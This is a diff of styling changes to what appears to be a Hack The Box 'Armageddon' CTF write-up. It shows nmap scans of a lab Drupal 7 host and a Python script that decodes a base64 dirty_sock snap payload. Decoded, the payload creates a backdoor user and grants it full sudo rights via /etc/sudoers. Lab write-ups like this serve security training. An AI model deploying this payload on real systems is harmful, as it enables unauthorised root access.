@@ -232,32 +232,32 @@ if (!doNotTrack) {
 </h2><ul>
 <li>We start of with an intense full port scan with nmap.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170</span>
-</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.129.100.170 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span> due to <span style="color:#ae81ff">55</span> out of <span style="color:#ae81ff">183</span> dropped probes since last increase.
-</span></span><span style="display:flex;"><span>Warning: 10.129.100.170 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.129.100.170 from <span style="color:#ae81ff">640</span> to <span style="color:#ae81ff">1000</span> due to <span style="color:#ae81ff">110</span> out of <span style="color:#ae81ff">366</span> dropped probes since last increase.
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> armageddon.htb <span style="color:#f92672">(</span>10.129.100.170<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.098s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">40576</span> closed ports, <span style="color:#ae81ff">24958</span> filtered ports
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"># Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170</span>
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#fb660a;font-weight:bold">for</span> 10.129.100.170 from <span style="color:#0086f7;font-weight:bold">0</span> to <span style="color:#0086f7;font-weight:bold">5</span> due to <span style="color:#0086f7;font-weight:bold">55</span> out of <span style="color:#0086f7;font-weight:bold">183</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Warning: 10.129.100.170 giving up on port because retransmission cap hit (10).
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#fb660a;font-weight:bold">for</span> 10.129.100.170 from <span style="color:#0086f7;font-weight:bold">640</span> to <span style="color:#0086f7;font-weight:bold">1000</span> due to <span style="color:#0086f7;font-weight:bold">110</span> out of <span style="color:#0086f7;font-weight:bold">366</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#fb660a;font-weight:bold">for</span> armageddon.htb (10.129.100.170)
+</span></span><span style="display:flex;"><span>Host is up (0.098s latency).
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#0086f7;font-weight:bold">40576</span> closed ports, <span style="color:#0086f7;font-weight:bold">24958</span> filtered ports
 </span></span><span style="display:flex;"><span>PORT   STATE SERVICE
 </span></span><span style="display:flex;"><span>80/tcp open  http
 </span></span></code></pre></div><ul>
 <li>Then we run another nmap scan to identify what version/service ports are running on.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170</span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> armageddon.htb <span style="color:#f92672">(</span>10.129.100.170<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.070s latency<span style="color:#f92672">)</span>.
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"># Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#fb660a;font-weight:bold">for</span> armageddon.htb (10.129.100.170)
+</span></span><span style="display:flex;"><span>Host is up (0.070s latency).
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_http-generator: Drupal <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>http://drupal.org<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">36</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+</span></span><span style="display:flex;"><span>|_http-generator: Drupal <span style="color:#0086f7;font-weight:bold">7</span> (http://drupal.org)
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#0086f7;font-weight:bold">36</span> disallowed entries (<span style="color:#0086f7;font-weight:bold">15</span> shown)
 </span></span><span style="display:flex;"><span>| /includes/ /misc/ /modules/ /profiles/ /scripts/
 </span></span><span style="display:flex;"><span>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
 </span></span><span style="display:flex;"><span>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
 </span></span><span style="display:flex;"><span>|_/LICENSE.txt /MAINTAINERS.txt
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
 </span></span><span style="display:flex;"><span>|_http-title: Welcome to  Armageddon |  Armageddon
 </span></span></code></pre></div><ul>
 <li>Nmap Identifies Port 80 To be running drupal 7 which is an old version and possibly surfring from many RCE&rsquo;s Exploits .</li>
@@ -358,26 +358,26 @@ if (!doNotTrack) {
 <p>i decoded the base64 and wrote it to a file using python</p>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;&#39;&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#39;&#39;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;==&#39;</span>)
-</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(payload)
-</span></span><span style="display:flex;"><span>open(<span style="color:#e6db74">&#34;crafted.snap&#34;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>)<span style="color:#f92672">.</span>write(d)
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">import</span> base64
+</span></span><span style="display:flex;"><span>payload = (<span style="color:#0086d2">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#39;&#39;&#39;</span> + <span style="color:#0086d2">&#39;A&#39;</span> * <span style="color:#0086f7;font-weight:bold">4256</span> + <span style="color:#0086d2">&#39;==&#39;</span>)
+</span></span><span style="display:flex;"><span>d = base64.b64decode(payload)
+</span></span><span style="display:flex;"><span>open(<span style="color:#0086d2">&#34;crafted.snap&#34;</span>,<span style="color:#0086d2">&#39;wb&#39;</span>).write(d)
 </span></span></code></pre></div><ul>
 <li>Then downloaded the file and installed it .</li>
 </ul>
